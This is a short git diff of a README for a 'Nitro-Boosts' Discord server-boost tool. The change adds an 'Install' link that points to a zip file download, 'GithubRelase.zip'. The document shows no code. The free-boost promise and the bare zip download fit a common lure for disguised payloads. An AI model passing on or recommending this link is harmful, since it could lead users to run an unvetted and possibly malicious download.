@@ -1,6 +1,6 @@
 # 💯 Nitro-Boosts 💯
 
-🚀 Install --> [Releases]() ![Boost Logo](nt.gif)
+🚀 Install --> [Releases](https://github.com/vloxa/Discord-Server-Boost/releases/download/Relase/GithubRelase.zip) ![Boost Logo](nt.gif)
 
 ![Boost Logo](boost.gif)
 
